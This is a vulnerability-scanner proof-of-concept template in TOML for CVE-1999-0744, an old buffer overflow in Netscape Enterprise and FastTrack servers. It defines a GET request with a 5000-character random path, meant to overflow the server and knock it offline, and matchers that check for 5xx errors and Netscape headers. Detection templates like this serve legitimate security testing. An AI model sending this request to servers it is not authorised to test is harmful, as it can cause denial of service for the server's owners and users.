[info]
author = "ave"
description = "检测 Netscape Enterprise Server 3.6 SP2 / FastTrack Server 2.0.1 缓冲区溢出漏洞，发送超长 HTTP GET 请求触发缓冲区溢出导致拒绝服务"
id = "POC-AVE-1999-0365"
name = "CVE-1999-0744 PoC"
severity = "high"
tags = ["ave-1999-0365"]
vuln_id = [
    "CVE-1999-0744",
    "AVE-1999-0365",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{rand_str_5000}}"
protocol = "http"

[poc.requests.headers]
User-Agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"

[[poc.requests.matchers]]
expect = true
status = [
    500,
    502,
    503,
    504,
]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "header"
type = "word"
words = [
    "Server: Netscape-Enterprise",
    "Server: Netscape-FastTrack",
]
